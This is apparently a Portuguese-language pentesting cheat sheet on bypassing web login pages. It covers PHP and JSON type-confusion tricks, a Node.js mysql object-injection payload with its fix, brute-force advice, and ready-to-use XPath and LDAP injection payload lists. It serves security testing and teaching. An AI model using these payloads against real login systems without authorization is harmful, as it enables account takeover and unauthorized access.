# Login Bypass

{{#include ../../banners/hacktricks-training.md}}

## **Bypass de login regular**

Se você encontrar uma página de login, aqui você pode encontrar algumas técnicas para tentar contorná-la:

- Verifique os **comentários** dentro da página (role para baixo e para a direita?)
- Verifique se você pode **acessar diretamente as páginas restritas**
- Verifique para **não enviar os parâmetros** (não envie nenhum ou apenas 1)
- Verifique o **erro de comparações PHP:** `user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
- **Mude o tipo de conteúdo para json** e envie valores json (bool true incluído)
- Se você receber uma resposta dizendo que POST não é suportado, você pode tentar enviar o **JSON no corpo, mas com uma requisição GET** com `Content-Type: application/json`
- Verifique o potencial erro de parsing do nodejs (leia [**isso**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
- O nodejs transformará essa carga em uma consulta semelhante à seguinte: ` SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` `**`password=password=1`**`;` o que faz com que a parte da senha seja sempre verdadeira.
- Se você puder enviar um objeto JSON, pode enviar `"password":{"password": 1}` para contornar o login.
- Lembre-se de que para contornar este login você ainda precisa **saber e enviar um nome de usuário válido**.
- **Adicionar `"stringifyObjects":true`** como opção ao chamar `mysql.createConnection` eventualmente **bloqueará todos os comportamentos inesperados quando `Object` for passado** no parâmetro.
- Verifique as credenciais:
- [**Credenciais padrão**](../../generic-hacking/brute-force.md#default-credentials) da tecnologia/plataforma utilizada
- **Combinações comuns** (root, admin, password, nome da tecnologia, usuário padrão com uma dessas senhas).
- Crie um dicionário usando **Cewl**, **adicione** o **nome de usuário** e a senha **padrão** (se houver) e tente forçar a senha usando todas as palavras como **nomes de usuário e senhas**
- **Forçar** usando um dicionário maior (**[**Brute force**](../../generic-hacking/brute-force.md#http-post-form)**)

### Bypass de autenticação por SQL Injection

[Aqui você pode encontrar várias dicas para contornar o login via **SQL injections**](../sql-injection/#authentication-bypass).

Na página seguinte você pode encontrar uma **lista personalizada para tentar contornar o login** via SQL Injections:

{{#ref}}
sql-login-bypass.md
{{#endref}}

### Bypass de autenticação por No SQL Injection

[Aqui você pode encontrar várias dicas para contornar o login via **No SQL Injections**](../nosql-injection.md#basic-authentication-bypass)**.**

Como as NoSQL Injections exigem a alteração do valor dos parâmetros, você precisará testá-los manualmente.

### Bypass de autenticação por XPath Injection

[Aqui você pode encontrar várias dicas para contornar o login via **XPath Injection.**](../xpath-injection.md#authentication-bypass)
```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```
### Bypass de autenticação por injeção LDAP

[Aqui você pode encontrar várias dicas para contornar o login via **injeção LDAP.**](../ldap-injection.md#login-bypass)
```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```
### Lembre-se de Mim

Se a página tiver a funcionalidade "**Lembre-se de Mim**", verifique como ela é implementada e veja se você pode abusar disso para **assumir outras contas**.

### Redirecionamentos

As páginas geralmente redirecionam os usuários após o login, verifique se você pode alterar esse redirecionamento para causar um [**Open Redirect**](../open-redirect.md). Talvez você possa roubar algumas informações (códigos, cookies...) se redirecionar o usuário para o seu site.

## Outras Verificações

- Verifique se você pode **enumerar nomes de usuários** abusando da funcionalidade de login.
- Verifique se o **preenchimento automático** está ativo nos **formulários** de senha/**informações** **sensíveis** **input:** `<input autocomplete="false">`

## Ferramentas Automáticas

- [HTLogin](https://github.com/akinerkisa/HTLogin)



{{#include ../../banners/hacktricks-training.md}}
